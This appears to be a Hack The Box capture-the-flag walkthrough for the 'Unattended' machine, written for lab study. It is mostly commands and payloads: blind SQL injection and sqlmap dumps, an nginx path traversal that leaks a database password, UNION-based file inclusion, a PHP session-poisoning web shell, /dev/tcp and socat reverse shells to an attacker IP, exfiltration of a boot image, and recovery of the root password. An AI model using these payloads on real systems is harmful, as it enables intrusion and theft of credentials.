## Unattended

https://app.hackthebox.com/machines/Unattended

### www-data

80/tcp  open  http     syn-ack nginx 1.10.3  
443/tcp open  ssl/http syn-ack nginx 1.10.3

We enumerate `nestedflanders.htb` and `www.nestedflanders.htb` on nmap output.

Enumerate directories with default threads enumerates `index.php` and `dev`.
```
gobuster dir -k -u https://www.nestedflanders.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

Index.php is different from index.html. There are three links inside, and each leads to a different ID parameter.
```
https://www.nestedflanders.htb/index.php?id=25
```

#### Blind SQLi

Testing adding a `'` like `id=25'` doesn't seem to be vulnerable. But if we try to access other existing page with this like `id=465'`, the response is also the main id 25, so something is happening here.

We can use this to perform query validations. If we enter `id=587' and 1=1-- -`, the content of page 587 is returned. If we enter `id=587' and 1=2-- -`, the content of main page is returned.

We script this to find the DB version on exploit.py.
```
https://www.nestedflanders.htb/index.php?id=587'+and+substring(@@version,1,1)='a'--+-
```

#### Using sqlmap
```
# Listing databases
sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --level=5 --risk=2 --batch --dbs

[*] information_schema
[*] neddy

# Listing tables inside "neddy" database
sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --level=5 --risk=2 --batch -D neddy --tables

+--------------+
| config       |
| customers    |
| employees    |
| filepath     |
| idname       |
| offices      |
| orderdetails |
| orders       |
| payments     |
| productlines |
| products     |
+--------------+
```

#### Finding Source Code
On /dev, we get this text: "dev site has been move to his own server". We can guess that the directory structure is something like this:
```
/var/www/html/dev
```

We can check for path traversal in miuconfigured NGINX aliases. Test for this with:

```
curl -s -k -I https://www.nestedflanders.htb/dev/ | grep HTTP
200 OK

curl -s -k -I https://www.nestedflanders.htb/dev../ | grep HTTP
403 Forbidden
```

Different responses, probably is vulnerable, so we can the source code with the payload below.
```
curl -s -k https://www.nestedflanders.htb/dev../html/index.php
```

```php
<?php
$servername = "localhost";
$username = "nestedflanders";
$password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
$db = "neddy";
$conn = new mysqli($servername, $username, $password, $db);
$debug = False;

include "6fb17817efb4131ae4ae1acae0f7fd48.php";

function getTplFromID($conn) {
        global $debug;
        $valid_ids = array (25,465,587);
        if ( (array_key_exists('id', $_GET)) && (intval($_GET['id']) == $_GET['id']) && (in_array(intval($_GET['id']),$valid_ids)) ) {
                        $sql = "SELECT name FROM idname where id = '".$_GET['id']."'";
        } else {
                $sql = "SELECT name FROM idname where id = '25'";
        }
        if ($debug) { echo "sqltpl: $sql<br>\n"; }

        $result = $conn->query($sql);
        if ($result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
                $ret = $row['name'];
        }
        } else {
                $ret = 'main';
        }
        if ($debug) { echo "rettpl: $ret<br>\n"; }
        return $ret;
}

function getPathFromTpl($conn,$tpl) {
        global $debug;
        $sql = "SELECT path from filepath where name = '".$tpl."'";
        if ($debug) { echo "sqlpath: $sql<br>\n"; }
        $result = $conn->query($sql);
        if ($result->num_rows > 0) {
                while($row = $result->fetch_assoc()) {
                        $ret = $row['path'];
                }
        }
        if ($debug) { echo "retpath: $ret<br>\n"; }
        return $ret;
}

$tpl = getTplFromID($conn);
$inc = getPathFromTpl($conn,$tpl);
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Ne(ste)d Flanders</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="bootstrap.min.css">
  <script src="jquery.min.js"></script>
  <script src="bootstrap.min.js"></script>
</head>
<body>

<div class="container">
  <h1>Ne(ste)d Flanders' Portfolio</h1>
</div>

<div class="container">
<div center class="row">
<?php

$sql = "SELECT i.id,i.name from idname as i inner join filepath on i.name = filepath.name where disabled = '0' order by i.id";
if ($debug) { echo "sql: $sql<br>\n"; }

$result = $conn->query($sql);
if ($result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
                //if ($debug) { echo "rowid: ".$row['id']."<br>\n"; } // breaks layout
                echo '<div class="col-md-2"><a href="index.php?id='.$row['id'].'" target="maifreim">'.$row['name'].'</a></div>';
                }
} else {
?>
        <div class="col-md-2"><a href="index.php?id=25">main</a></div>
        <div class="col-md-2"><a href="index.php?id=465">about</a></div>
        <div class="col-md-2"><a href="index.php?id=587">contact</a></div>
        <?php
}

?>
</div> <!-- row -->
</div> <!-- container -->


<div class="container">
<div class="row">
<!-- <div align="center"> -->
<?php
include("$inc");
?>
<!-- </div> -->

</div> <!-- row -->
</div> <!-- container -->
<?php if ($debug) { echo "include $inc;<br>\n"; } ?>

</body>
</html>

<?php
$conn->close();
?>
```

<br>

**Controlling id --> tpl**

The query is this:
```sql
SELECT name FROM idname where id = $_GET['id']
```

Look at what table looks:
```
sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --level=5 --risk=2 --batch -D neddy -T idname --dump

+-----+-------------+----------+
| id  | name        | disabled |
+-----+-------------+----------+
| 1   | main.php    | 1        |
| 2   | about.php   | 1        |
| 3   | contact.php | 1        |
| 25  | main        | 0        |
| 465 | about       | 0        |
| 587 | contact     | 0        |
+-----+-------------+----------+
```

To see if we can control the output, we start with id 587, but uses UNION select to query "about" page that id is 465.
```
# Payload
587' and 1=2 UNION select 'about'-- -

# Query
SELECT name FROM idname where id = 587 and 1=2 UNION select "about"
```

<br>

**Controlling tpl --> inc**  

Now that we can control tpl, we will inject what is included in the page.

The query is:
```sql
SELECT path from filepath where name = $tpl
```

Dumping this table:
```
sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --level=5 --risk=2 --batch -D neddy -T filepath --dump

+---------+--------------------------------------+
| name    | path                                 |
+---------+--------------------------------------+
| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |
| contact | 0f710bba8d16303a415266af8bb52fcb.php |
| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
+---------+--------------------------------------+
```

To full control the result, we want the query to be something like:
```
SELECT path from filepath where name = 0xdf UNION select /etc/passwd
```

Since we need to pass through the previous function, we will start the injection as before and replace the second injection as well.
```
587' and 1=2 UNION select '0xdf\' union select \'/etc/passwd\'-- -
```

#### Shell
To get a shell we will perform a log poisoning by adding a malicious cookie and reading it in our php session inside `/var/lib/php/sessions/`.

Our cookie is `ts59o3kme7rf31qgpv0d4fsna2`, so the file poisoned will be `/var/lib/php/sessions/sess_ts59o3kme7rf31qgpv0d4fsna2`.

Add this cookie and perform the LFI:
```
# URL encoded it on request
shell=<?php system($_GET['cmd']); ?>

# Include reverse shell command parameter
cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.2/1337 0>&1'

/index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/1337+0>%261'&id=587%27%20and%201=2%20UNION%20select%20%270xdf\%27%20union%20select%20\%27/var/lib/php/sessions/sess_ts59o3kme7rf31qgpv0d4fsna2%27--%20-%27--%20-

# Use port 443, tried port 1337 and it didn't work.
# You can enumerate firewall rules on /etc/iptables/rules.v4

# Get a better shell with
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.2:443
```

Since this machine doesn't have python, you can get a full TTY with socat using this as listener:
```
socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr
```

<br>

### Guly User

We can connect into myql with the credentials enumerated on index.php:
```shell
mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e
```

Listing table config inside neddy database, we enumerate this interesting row:
```
| 86 | checkrelease | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;
```

We can update this row and get a shell.
```sql
update config set option_value = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.2:443" where id = 86;

select * from config where id = 86;
```

<br>

### Privilege Escalation
Running `id`, we see that guly belongs to "grub" group.

Looking at `mount` output, we see `/dev/mapper/sda2_crypt`. This indicates that the disk is encrypted.

Also, `find / -group grub -ls 2>/dev/null` returns as a boot image.

We can copy this image to our box and decompress it.
```bash
nc -lvnp 443 > initrd.img

cat /boot/initrd.img-4.9.0-8-amd64 > /dev/tcp/10.10.14.2/443

zcat initrd.img | cpio -idmv
```

We can search for files between dates.
```bash
find . -type f -newermt 2018-12-19 ! -newermt 2018-12-21 -ls
```

Analyzing `./scripts/local-top/cryptroot`, we find the function that encrypts and this command:
```bash
/sbin/uinitrd c0m3s3f0ss34nt4n1
```

If we run this command on our image, we get "supercazzola".

We can trace what the binary is doing with strace.
```bash
strace uinitrd
```

It seems to open `/etc/hostname` or `/boot/guid`. Create this file on our machine with the content of the victim and execute `/sbin/uinitrd c0m3s3f0ss34nt4n1` again to get the root password.

<br>

You can also perform all of this in victim's machine as below.
```
# Copy img to /tmp/initrd
mkdir initrd
cd initrd

cp /boot/initrd.img-4.9.0-8-amd64 .

# Use gzip
mv initrd.img-4.9.0-8-amd64 initrd.img-4.9.0-8-amd64.gz
gzip -d initrd.img-4.9.0-8-amd64.gz

# Extract it
cpio -idvm < initrd.img-4.9.0-8-amd64

# Copy to home and execute it
cd
cp /tmp/initrd/sbin/uinitrd .

./uinitrd c0m3s3f0ss34nt4n1
```

#### Extra

IppSec run `gixy` to inspect nginx and find vulnerabilities.
